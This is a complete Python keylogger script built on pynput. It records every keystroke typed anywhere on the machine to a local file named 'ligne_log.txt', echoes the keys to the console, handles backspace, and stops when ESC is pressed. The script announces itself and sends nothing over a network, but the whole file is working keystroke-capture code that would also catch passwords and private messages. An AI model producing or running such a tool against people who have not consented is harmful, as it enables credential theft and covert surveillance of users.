from pynput.keyboard import Listener, Key

class Keylogger: 
    def __init__(self):
        self.log_file = "ligne_log.txt" 
        self.is_logging = False
        self.listener = None

        open(self.log_file, 'a', encoding='utf-8').close()

    def write_to_log(self, key):
        try:
            letter = key.char  
        except AttributeError:
            if key == Key.space:
                letter = ' '
            elif key == Key.enter:
                letter = '\n'  
            elif key == Key.tab:
                letter = '[TAB]'
            elif key == Key.esc:
                self.stop_logging()
                return False  
            elif key == Key.backspace:
                with open(self.log_file, 'r+', encoding='utf-8') as f:
                    content = f.read()
                    f.seek(0)  
                    f.write(content[:-1])  
                    f.truncate()  
                return True  
            else:
                letter = f'[{str(key)}]' 

        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(letter)

        print(letter, end='', flush=True)

        return True

    def start_logging(self):
        if not self.is_logging:
            self.is_logging = True
            print("Keylogger started. Press ESC to stop")

            self.listener = Listener(on_press=self.write_to_log)
            self.listener.start()

    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            print("\nKeylogger stopped")

            if self.listener:
                self.listener.stop()

if __name__ == "__main__":
    keylogger = Keylogger()

    keylogger.start_logging()

    try:
        while keylogger.is_logging:
            pass
    except KeyboardInterrupt:
        keylogger.stop_logging()
